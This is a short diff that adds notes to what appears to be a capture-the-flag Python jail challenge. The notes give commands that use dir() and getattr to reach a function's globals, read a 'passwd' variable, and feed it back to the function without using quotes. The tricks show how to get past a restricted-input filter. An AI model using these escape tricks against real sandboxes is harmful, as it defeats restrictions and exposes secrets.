@@ -1,0 +1,9 @@
+Commands List
+-------------
+
+Here we check in `func_globals`
+Also we use `getattr`
+
+print(dir(getout))
+print(getattr(getout,dir(getout)[-2]))   # We see passwd as a global variable
+print(getout(getattr(getout, dir(getout)[-2])[list(getattr(getout, dir(getout)[-2]))[-7]]))  # Use the value of passwd as parameter for getout as we can't use quotes hence the long way
